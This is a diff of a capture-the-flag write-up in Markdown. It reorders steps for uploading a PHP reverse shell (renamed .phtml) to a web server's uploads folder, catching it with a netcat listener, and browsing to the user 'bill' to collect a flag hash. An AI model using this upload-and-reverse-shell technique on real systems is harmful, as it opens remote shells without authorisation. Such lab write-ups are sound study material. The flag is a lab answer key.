@@ -282,14 +282,38 @@ Rename this file to php-reverse-shell.phtml
 
 We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234
 
-Upload your shell and navigate to `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml `- This will execute your payload
-
-You should see a connection on your netcat session
-
 ![[Pasted image 20220814074442.png]]
 
 ![[Pasted image 20220814074625.png]]
 
+
+Upload your shell and navigate to `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml `- This will execute your payload
+
+
 ![[Pasted image 20220814074806.png]]
 
+You should see a connection on your netcat session
 
+![[Pasted image 20220814075539.png]]
+
+![[Pasted image 20220814075617.png]]
+
+What is the name of the user who manages the webserver?
+Ans. bill
+
+```
+$ cd home
+ls$ 
+bill
+$ file bill
+bill: directory
+$ cd bill
+$ ls
+user.txt
+$ 
+
+```
+
+
+
+Flag: 8bd7992fbe8a6ad22a63361004cfcedb
